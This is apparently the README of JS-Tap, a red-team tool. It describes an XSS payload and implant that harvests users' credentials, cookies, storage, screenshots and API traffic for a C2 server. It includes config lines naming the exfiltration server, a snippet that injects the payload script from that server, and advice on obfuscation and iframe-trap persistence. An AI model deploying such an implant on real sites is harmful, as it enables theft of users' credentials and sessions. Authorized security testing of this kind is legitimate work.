# JS-Tap
### v2.12
## This tool is intended to be used on systems you are authorized to attack. Do not use this tool for illegal purposes, or I will be very angry in your general direction.

## Changelogs
Major changes are documented in the project Announcements:<br>
<https://github.com/hoodoer/JS-Tap/discussions/categories/announcements>

## Demo
You can read the original blog post about JS-Tap here:<br>
<https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams>

Short demo from ShmooCon of JS-Tap version 1:<br>
<https://youtu.be/IDLMMiqV6ss?si=XunvnVarqSIjx_x0&t=19814>

Demo of JS-Tap version 2 at HackSpaceCon, including C2 and how to use it as a post exploitation implant:<br>
<https://youtu.be/aWvNLJnqObQ?t=11719>


## Upgrade warning
I do not plan on creating migration scripts for the database, and version number bumps often involve database schema changes (check the changelogs). You should probably delete your jsTap.db database on version bumps. If you have custom payloads in your JS-Tap server, make sure you export them before you delete the database files. 


## Introduction
JS-Tap is a generic JavaScript payload and supporting software to help red teamers attack webapps. The JS-Tap payload can be used as an XSS payload or as a post exploitation implant. 

The payload does not require the targeted user running the payload to be authenticated to the application being attacked, and it does not require any prior knowledge of the application beyond finding a way to get the JavaScript into the application. 

Instead of attacking the application server itself, the JS-Tap payload focuses on the client-side of the application and heavily instruments the client-side code. A C2 system allows custom JavaScript payloads to be added and run as tasks on JS-Tap clients, providing a means to attack the application server directly. To facilitate faster transition to attacking the server, JS-Tap now includes a "mimic" feature to automatically generate custom payloads and hand them off to the C2 system. 

The example JS-Tap payload is contained in the **telemlib.js** file in the payloads directory, however any file in this directory is served unauthenticated so you can serve multiple payloads with different configurations targeting different applications at the same time. <br> 

Copy the **telemlib.js** file to whatever filename you wish and modify the configuration as needed. This file has _not_ been obfuscated. Prior to using in an engagement strongly consider changing the naming of endpoints, stripping comments, and highly obfuscating the payload. 

Make sure you review the configuration section below carefully before using on a publicly exposed server. 

## Data Collected
* Client IP address, OS, Browser
* User inputs (credentials, etc.)
* URLs visited
* Cookies (that don't have **httponly** flag set)
* Local Storage
* Session Storage
* HTML code of pages visited (if feature enabled)
* Screenshots of pages visited
* Copy of Form Submissions
* Copy of XHR API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Headers set
	- Basic Auth
	- Response status code
	- Request body and response body
* Copy of Fetch API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Response status code
	- Headers set
	- Request body and response body
* Custom Exfiltrated Data
	- Data sent back from custom payloads in the C2 system

Note: ability to receive copies of XHR and Fetch API calls works in trap mode. In implant mode only Fetch API can be copied currently. Interception of form submissions can sometimes be missed in implant mode.  

## Operating Modes
The payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
#### Trap Mode
Trap mode is typically the mode you would use as a XSS payload. Execution of XSS payloads is often fleeting, the user viewing the page where the malicious JavaScript payload runs may close the browser tab (the page isn't interesting) or navigate elsewhere in the application. In both cases, the payload will be deleted from memory and stop working. JS-Tap needs to run a long time or you won't collect useful data. 

Trap mode combats this by establishing persistence using an [iFrame trap technique](https://trustedsec.com/blog/persisting-xss-with-iframe-traps). The JS-Tap payload will create a full page iFrame, and start the user elsewhere in the application. This starting page must be configured ahead of time. In the **initGlobals()** function search for the **window.taperstartingPage** variable and set it to an appropriate starting location in the target application. 

In trap mode JS-Tap monitors the location of the user in the iframe trap and it spoofs the address bar of the browser to match the location of the iframe. 

Note that the application targeted must allow iFraming from same-origin or self if it's setting CSP or X-Frame-Options headers. JavaScript based framebusters can also prevent iFrame traps from working. 

Note, I've had good luck using Trap Mode for a post exploitation implant in very specific locations of an application, or when I'm not sure what resources the application is using inside the authenticated section of the application. You can put an implant in the login page, with trap mode and the trap mode start page set to **window.location.href** (i.e. current location). The trap will set when the user visits the login page, and they'll hopefully contine into the authenticated portions of the application inside the iframe trap.

A user refreshing the page will generally break/escape the iframe trap. 

#### Implant Mode
Implant mode would typically be used if you're directly adding the payload into the targeted application. Perhaps you have a shell on the server that hosts the JavaScript files for the application. Add the payload to a JavaScript file that's used throughout the application (jQuery, main.js, etc.). Which file would be ideal really depends on the app in question and how it's using JavaScript files. Implant mode does not require a starting page to be configured, and does not use the iFrame trap technique. 

A user refreshing the page in implant mode will generally continue to run the JS-Tap payload. 


## Installation and Start
Requires python3. A large number of dependencies are required for the jsTapServer, you are **highly** encouraged to use python virtual environments to isolate the libraries for the server software (or whatever your preferred isolation method is). 

Example:
```
mkdir jsTapEnvironment
python3 -m venv jsTapEnvironment
source jsTapEnvironment/bin/activate
cd jsTapEnvironment
git clone https://github.com/hoodoer/JS-Tap
cd JS-Tap
pip3 install -r requirements.txt

run in debug/single thread mode:
python3 jsTapServer.py

run with gunicorn multithreaded (production use):
./jstapRun.sh
```

A new admin password is generated on startup. If you didn't catch it in the startup print statements you can find the credentials saved to the **adminCreds.txt** file. 

If an existing database is found by jsTapServer on startup it will ask you if you want to keep existing clients in the database or drop those tables to start fresh.



Note that on Mac I also had to install libmagic outside of python.
```
brew install libmagic
```
Playing with JS-Tap locally is fine, but to use in a proper engagment you'll need to be running JS-Tap on publicly accessible VPS and setup JS-Tap with **PROXYMODE** set to True. Use NGINX on the front end to handle a valid certificate. 


## Configuration
### JS-Tap Server Configuration
#### Debug/Single thread config
If you're running JS-Tap with the jsTapServer.py script in single threaded mode (great for testing/demos) there are configuration options directly in the jsTapServer.py script. 

##### Proxy Mode
For production use JS-Tap should be hosted on a publicly available server with a proper SSL certificate from someone like letsencrypt. The easiest way to deploy this is to allow NGINX to act as a front-end to JS-Tap and handle the letsencrypt cert, and then forward the decrypted traffic to JS-Tap as HTTP traffic locally (i.e. NGINX and JS-Tap run on the same VPS). 

If you set **proxyMode** to true, JS-Tap server will run in HTTP mode, and take the client IP address from the **X-Forwarded-For** header, which NGINX needs to be configured to set. 

When **proxyMode** is set to false, JS-Tap will run with a self-signed certificate, which is useful for testing. The client IP will be taken from the source IP of the connecting client. 


##### Data Directory
The **dataDirectory** parameter tells JS-Tap where the directory is to use for the SQLite database and loot directory. Not all "loot" is stored in the database, screenshots and scraped HTML files in particular are not. 

##### Server Port
To change the server port configuration see the last line of **jsTapServer.py**

```
app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
```

#### Gunicorn Production Configuration
Gunicorn is the preferred means of running JS-Tap in production. The same settings mentioned above can be set in the jstapRun.sh bash script. Values set in the startup script take precedence over the values set directly in the **jsTapServer.py** script when JS-Tap is started with the gunicorn startup script. 

A big difference in configuration when using Gunicorn for serving the application is that you need to configure the number of workers (heavy weight processes) and threads (lightweight serving processes). JS-Tap is a very I/O heavy application, so using threads in addition to workers is beneficial in scaling up the application on multi-processor machines. Note that if you're using NGINX on the same box you need to configure NGNIX to also use multiple processes so you don't bottleneck on the proxy itself. 

At the top of the jstapRun.sh script are the **numWorkers** and **numThreads** parameters. I like to use number of CPUs + 1 for workers, and 4-8 threads depending on how beefy the processors are. For NGINX in its configuration I typically set **worker_processes auto;**

Proxy Mode is set by the **PROXYMODE** variable, and the data directory with the **DATADIRECTORY** variable. Note the data directory variable needs a trailing '/' added. 


Using the gunicorn startup script will use a self-signed cert when started with **PROXYMODE** set to False. You need to generate that self-signed cert first with:<br>
**openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes**


### JS-Tap Payload (telemlib.js) Configuration
These configuration variables are in the **initGlobals()** function. 

#### JS-Tap Server Location
You need to configure the payload with the URL of the JS-Tap server it will connect back to. 
```
window.taperexfilServer = "https://127.0.0.1:8444";
```

#### Mode
Set to either **trap** or **implant**
This is set with the variable:
```
window.taperMode = "trap";
or
window.taperMode = "implant";
```

#### Trap Mode Starting Page
Only needed for trap mode. See explanation in **Operating Modes** section above.<br>
Sets the page the user starts on when the iFrame trap is set.  
```
window.taperstartingPage = "http://targetapp.com/somestartpage";
```

If you want the trap to start on the current page, instead of redirecting the user to a different page in the iframe trap, you can use:
```
window.taperstartingPage = window.location.href;
```
#### Client Tag
Useful if you're using JS-Tap against multiple applications or deployments at once and want a visual indicator of what payload was loaded. Remember that the entire /payloads directory is served, you can have multiple JS-Tap payloads configured with different modes, start pages, and client tags.

This tag string (keep it short!) is prepended to the client nickname in the JS-Tap portal. Setup multiple payloads, each with the appropriate configuration for the application its being used against, and add a tag indicating which app the client is running. 
```
window.taperTag = 'whatever';
```
#### Custom Payload Tasks
Used to configure if clients are checking for **Custom Payload** tasks, and how often they're checking. The jitter settings
Let you optionally set a floor and ceiling modifier. A random value between these two numbers will be picked
and added to the check delay. Set these to 0 and 0 for no jitter. 
```
window.taperTaskCheck        = true;
window.taperTaskCheckDelay   = 5000;
window.taperTaskJitterBottom = -2000;
window.taperTaskJitterTop    = 2000;
```

#### Exfiltrate HTML
true/false setting on whether a copy of the HTML code of each page viewed is exfiltrated. These exfiltrated HTML files are needed for finding CSRF token sources when autogenerating form submission custom payloads. 

```
window.taperexfilHTML = true;
```


#### Copy Form Submissions
true/false setting on whether to intercept a copy of all form posts. 

```
window.taperexfilFormSubmissions = true;
```


#### MonkeyPatch APIs
Enable monkeypatching of XHR and Fetch APIs. This works in trap mode. In implant mode, only Fetch APIs are monkeypatched. Monkeypatching allows JavaScript to be rewritten at runtime. Enabling this feature will re-write the XHR and Fetch networking APIs used by JavaScript code in order to tap the contents of those network calls. Note that jQuery and Ajax based network calls will be captured in the XHR API, which they use under the hood for network calls. Autogenerating API call custom payloads depends of course on intercepting API calls using this monkeypatch feature. 

```
window.monkeyPatchAPIs = true;
```

#### Screenshot after API calls
By default JS-Tap will capture a new screenshot after the user navigates to a new page. Some applications do not change their path when new data is loaded, which would cause missed screenshots. JS-Tap can be configured to capture a new screenshot after an XHR or Fetch API call is made. These API calls are often used to retrieve new data to display. Two settings are offered, one to enable the "after API call screenshot", and a delay in milliseconds. X milliseconds after the API call JS-Tap will capture the new screenshot. 

```
window.postApiCallScreenshot = true;
window.screenshotDelay       = 1000;
```

## JS-Tap Portal
Login with the admin credentials provided by the server script on startup. 

Clients show up on the left, selecting one will show a time series of their events (loot) on the right. 

The clients list can be sorted by time (first seen, last update received) and the list can be filtered to only show the "starred" clients. There is also a quick filter search above the clients list that allows you to quickly filter clients that have the entered string. Useful if you set an optional tag in the payload configuration. Optional tags show up prepended to the client nickname. 

Each client has an 'x' button (near the star button). This allows you to delete the session for that client, if they're sending junk or useless data, you can prevent that client from submitting future data. 

When the JS-Tap payload starts, it retrieves a session from the JS-Tap server. If you want to stop all new client sessions from being issues, select **App Settings** at the top and you can disable new client sessions. 

You can also configure email notifications in **App Settings** to notifiy on new clients, or new events for clients. This is SMTP (TLS) based only, and you can have the notification emails go to multiple recipients. An "email delay" option prevents constant email spamming, you'll get a roll-up email of all notifications that happend in the delay period. 

You can change how often the client list automatically updates in the **App Settings** and you can also block specific IP addresses from receiving a JS-Tap session in here. 

Each client has a "notes" feature. If you find juicy information for that particular client (credentials, API tokens, etc) you can add it to the client notes. After you've reviewed all your clients and made your notes, the **View All Notes** feature at the top allows you to export all notes from all clients at once. 

The events list can be filtered by event type if you're trying to focus on something specific, like screenshots. Note that the events/loot list does _not_ automatically update (the clients list does). If you want to load the latest events for the client you need to select the client again on the left. 

#### Custom Payloads
Starting in version 1.02 there is a custom payload feature. Multiple JavaScript payloads can be added in the JS-Tap portal and executed on a single client, all current clients, or set to autorun on all future clients. Payloads can be written/edited within the JS-Tap portal, or imported from a file. Payloads can also be exported. The format for importing payloads is simple JSON. The JavaScript code and description are simply base64 encoded. 
```
[{"code":"YWxlcnQoJ1BheWxvYWQgMSBmaXJpbmcnKTs=","description":"VGhlIGZpcnN0IHBheWxvYWQ=","name":"Payload 1"},{"code":"YWxlcnQoJ1BheWxvYWQgMiBmaXJpbmcnKTs=","description":"VGhlIHNlY29uZCBwYXlsb2Fk","name":"Payload 2"}]
```
If your custom payload needs to exfiltrate data you can use the <i>customExfil(note, data)</i> method. Calling this method in your custom payload will send that text data back to JS-Tap and it will be displayed as an event in the loot data.<br>

The main user interface for custom payloads is from the top menu bar. Select **Custom Payloads** to open the interface. Any existing payloads will be shown in a list on the left. The button bar allows you to import and export the list. Payloads can be edited on the right side, although you can press the **Expand Code** button to get a larger code editing pane. To load an existing payload for editing select the payload by clicking on it in the **Saved Payloads** list. Once you have payloads defined and saved, you can execute them on clients. <br>

In the main **Custom Payloads** view you can launch a payload against all current clients (the **Run** button). You can also toggle on the **Autorun** attribute of a payload, which means that all new clients will run the payload. Note that existing clients will not run a payload based on the Autorun setting. <br>

You can toggle on **Repeat** and the payload will be tasked for each client when they check for tasks. Remember, the rate that a client checks for custom payload tasks is variable, and that rate can be changed in the main JS-Tap payload configuration. That rate can be changed with a custom payload (calling the <i>updateTaskCheckInterval(newDelay)</i> function). The jitter in the task check delay can be set with the <i>updateTaskCheckJitter(newTop, newBottom)</i> function. <br>

The **Clear All Jobs** button in the custom payload UI will delete all custom payload jobs from the queue for all clients and resets the auto/repeat run toggles. <br>

To run a payload on a single client user the **Run Payload** button on the specific client you wish to run it on, and then hit the **Run** button for the specific payload you wish to use. You can also set **Repeat** on individual clients. 


#### Autogenerated Custom Payloads (Mimic)
Starting in version 2.1 JS-Tap includes the ability to automatically generate custom payloads. This feature leverages the ability to intercept form submissions and XHR/Fetch API calls. JS-Tap can use those intercepted communications as a prototype to build a payload around. <br>

Parameters in the request will be set by variables at the top of the autogenerated payload, making for easy modification of the action being performed. Form submissions which need a CSRF token, and XHR/Fetch API calls that require an Authorization header will be handled by the mimic wizard; you can select these values in the intercepted form submission/api call and JS-Tap will search its database to determine where these values come from. <br>

A payload will be generated that first fetches the current value for these items in the user's browser, since these values will likely be different over time and across different users. The retrieved values will be used in the subsequent request that passes your modified parameters to the server to perform the action being "mimicked".<br>

If you skip searching for these values, the request doesn't have them, or JS-Tap cannot find the source, a payload will be generated that uses the CSRF tokens and Authorization header values from the original intercepted request. <br>

To use the mimic feature to create autogenerated payloads, find an intercepted form submission or API call and press the **Create Mimic Payload** button on the event card in the loot column. This will open the wizard where you select either a CSRF token (for form submissions) or Authorization headers for API calls. You'll need to copy the parameter/header name into the name field, and the token value into the value field. Once that is done, hit the **Search** button to let JS-Tap determine where these values are stored or retrieved from. <br>

If JS-Tap finds the source of those values, hitting next will generate the payload and enter it into the C2 system as a new payload. Change the payload name, description, and the parameter values at the top of the generated code to your desired settings and save it. You can then run that payload on JS-Tap clients. 


## Tools
A few tools are included in the tools subdirectory. 

### clientSimulator.py
A script to stress test the jsTapServer. Good for determining roughly how many clients your server can handle. Note that running the clientSimulator script is probably more resource intensive than the actual jsTapServer, so you may wish to run it on a separate machine. 

At the top of the script is a **numClients** variable, set to how many clients you want to simulator. The script will spawn a thread for each, retrieve a client session, and send data in simulating a client. 

```
numClients = 50
```

You'll also need to configure where you're running the jsTapServer for the clientSimulator to connect to:
```
apiServer = "https://127.0.0.1:8444"
```

JS-Tap run using gunicorn scales quite well. 

### MonkeyPatchApp
A simple app used for testing XHR/Fetch monkeypatching, but can give you a simple app to test the payload against in general. 

Run with:
```
python3 monkeyPatchLab.py
```

By default this will start the application running on:
```
https://127.0.0.1:8443
```

Pressing the "Inject JS-Tap payload" button will run the JS-Tap payload. This works for either implant or trap mode. You may need to point the monkeyPatchLab application at a new JS-Tap server location for loading the payload file, you can find this set in the **injectPayload()** function in **main.js**

```
function injectPayload()
{
	document.head.appendChild(Object.assign(document.createElement('script'),
		{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));
}
```

### DefconApp
Another simple app similiar to the MonkeyPathApp, however the XHR API calls in this application makes a visible change in the application (changing the "defcon" level).<br>

It also has a **Inject Js-Tap payload** button that simulates and XSS exploit. All of the code is included in the **defconServer.py** file, including the JavaScript and HTML.<br>

This application is a good test for autogenerating payloads from intercepted XHR network calls. 

### formParser.py
Abandoned tool, is a good start on analyzing HTML for forms and parsing out their parameters. Intended to help automatically generate JavaScript payloads to target form posts. 

You should be able to run it on exfiltrated HTML files. Again, this is currently abandonware and has been superceded by the mimic feature that autogenerates custom payloads. 


### generateIntelReport.py
No longer working, used before the web UI for JS-Tap. The generateIntelReport script would comb through the gathered loot and generate a PDF report. Saving all the loot to disk is now disabled for performance reasons, most of it is stored in the datagbase with the exception of exfiltratred HTML code and screenshots. 




## Contact
@hoodoer<br>
hoodoer@bitwisemunitions.dev





